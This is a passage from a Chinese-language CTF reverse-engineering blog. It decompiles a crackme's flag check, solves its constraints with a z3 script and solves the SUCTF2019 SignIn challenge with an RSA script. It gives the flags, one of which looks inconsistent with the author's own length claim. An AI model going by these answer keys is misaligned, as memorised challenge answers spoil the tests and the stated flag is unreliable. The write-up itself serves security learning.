class="line-numbers-rows"><span></span></span></code></pre><p>直接使用上方的命令脱一下壳。</p><p><img src="/2021/05/28/CTF/image-20210607132642504.png" alt></p><p>对上方的关键的字符串进行一下跟踪，追到下面的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_400E28</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">int</span> a5<span class="token punctuation">,</span> <span class="token keyword">int</span> a6<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er8</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// er9</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v12 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40F950</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"input your flag:"</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> a6<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40FA80</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v12 <span class="token punctuation">)</span>    <span class="token function">sub_443550</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再追踪一下<code>sub_4009AE</code>这个函数，发现里面的C代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> <span class="token operator">*</span>a1 <span class="token operator">!=</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变成数学问题了，变成数学问题就简单的多了。</p><p>看起来应该是<code>a1</code>这个字符数组里面的内容就是我们要找的flag了，并且长度也是32位，符合一般的flag的32位的md5的特征，所以直接解一下方程即可，编写<code>z3-solver</code>脚本如下(注意要先下载<code>z3-solver</code>库)。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Int<span class="token punctuation">(</span><span class="token string">'a1['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># z3声名整数型的符号变量</span><span class="token comment"># add为添加至z3约束求解器中的内容</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">)</span><span class="token comment"># z3约束求解</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>a <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>temp<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;e65421110ba03099a1c039337&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始没发现a1[6]并没有给，看wp知道a1[6]的值为<code>1</code>，故flag为</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;e165421110ba03099a1c039337&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h3><p><strong>TAG:RSA、ELF文件</strong></p><p>没壳，打开一看不就是RSA吗，看到65537就感觉不简单，简单解下RSA即可</p><p><img src="/2021/05/28/CTF/image-20210607165616788.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn <span class="token operator">=</span> <span class="token number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>c <span class="token operator">=</span> <span class="token number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span>e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">282164587459512124844245113950593348271</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'suctf&#123;Pwn_@_hundred_years&#125;'</span><span 